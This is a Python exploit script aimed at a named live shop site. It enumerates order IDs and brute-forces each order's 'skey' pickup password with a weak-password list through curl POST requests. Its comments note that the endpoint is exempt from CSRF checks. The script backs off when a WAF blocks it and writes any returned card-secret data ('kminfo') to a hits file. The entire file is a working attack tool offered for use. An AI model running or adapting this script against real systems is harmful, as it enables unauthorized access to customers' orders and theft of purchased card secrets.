#!/usr/bin/env python3
"""
xinhe001 order IDOR exploit helper
Target: POST ajax.php?act=order  {id, skey}
skey = 用户下单时填写的「取卡密码」

CSRF: act=order 在 noCsrfActions 白名单，无需 csrf_token (csrf.js)

Usage (when IP not blocked):
  python3 xinhe_idor.py --id 1 --wordlist passwords.txt
  python3 xinhe_idor.py --range 1 5000 --passwords 123456,test,password,888888
"""
import argparse, hashlib, json, time, subprocess, sys

BASE = "https://xinhe001.lol/shop/ajax.php?act=order"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
DELAY = 8

COMMON_PASSWORDS = [
    "", "1", "123456", "12345678", "888888", "666666", "password",
    "test", "test123", "abc123", "qwerty", "111111", "000000",
    "123123", "a123456", "1234567890", "admin", "root",
]

# skey 候选: 取卡密码常见弱口令 + mysid 格式 (32hex)
def gen_skeys(extra=None):
    s = set(COMMON_PASSWORDS)
    if extra:
        s.update(extra)
    return list(s)


def post_order(oid, skey, timeout=20):
    time.sleep(DELAY)
    data = f"id={oid}&skey={skey}"
    cmd = [
        "curl", "-sS", "-m", str(timeout), "-A", UA,
        "-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "Accept-Language: zh-CN,zh;q=0.9",
        "-d", data, BASE,
    ]
    try:
        return subprocess.check_output(cmd, stderr=subprocess.STDOUT).decode("utf-8", "replace")
    except subprocess.CalledProcessError as e:
        return e.output.decode("utf-8", "replace")


def try_id(oid, passwords, verbose=True):
    for skey in passwords:
        body = post_order(oid, skey)
        if "reset" in body.lower() or "Empty reply" in body:
            print(f"[!] WAF block on id={oid}, backing off 60s", file=sys.stderr)
            time.sleep(60)
            body = post_order(oid, skey)
        if verbose:
            print(f"  id={oid} skey={skey!r:15} -> {body[:120]}")
        if '"code":0' in body:
            try:
                j = json.loads(body)
                if j.get("kminfo"):
                    return {"hit": True, "id": oid, "skey": skey, "kminfo": j["kminfo"], "full": j}
                return {"hit": True, "id": oid, "skey": skey, "full": j}
            except json.JSONDecodeError:
                return {"hit": True, "id": oid, "skey": skey, "raw": body}
    return {"hit": False, "id": oid}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--id", type=int)
    ap.add_argument("--range", nargs=2, type=int, metavar=("START", "END"))
    ap.add_argument("--passwords", default="", help="comma-separated extra passwords")
    ap.add_argument("--wordlist", help="password file")
    ap.add_argument("-o", "--output", default="xinhe_idor_hits.json")
    args = ap.parse_args()

    passwords = gen_skeys()
    if args.passwords:
        passwords = gen_skeys(args.passwords.split(","))
    if args.wordlist:
        with open(args.wordlist) as f:
            passwords = list(set(passwords + [l.strip() for l in f if l.strip()]))

    ids = []
    if args.id:
        ids = [args.id]
    elif args.range:
        ids = list(range(args.range[0], args.range[1] + 1))
    else:
        ap.print_help()
        return

    hits = []
    for oid in ids:
        print(f"[*] probing order id={oid} ({len(passwords)} passwords)", flush=True)
        r = try_id(oid, passwords)
        if r["hit"]:
            print(f"[+] HIT id={oid} skey={r['skey']}", flush=True)
            if "kminfo" in r:
                print(f"    KMINFO: {r['kminfo'][:200]}", flush=True)
            hits.append(r)

    with open(args.output, "w") as f:
        json.dump(hits, f, ensure_ascii=False, indent=2)
    print(f"[*] done: {len(hits)} hits -> {args.output}", flush=True)


if __name__ == "__main__":
    main()
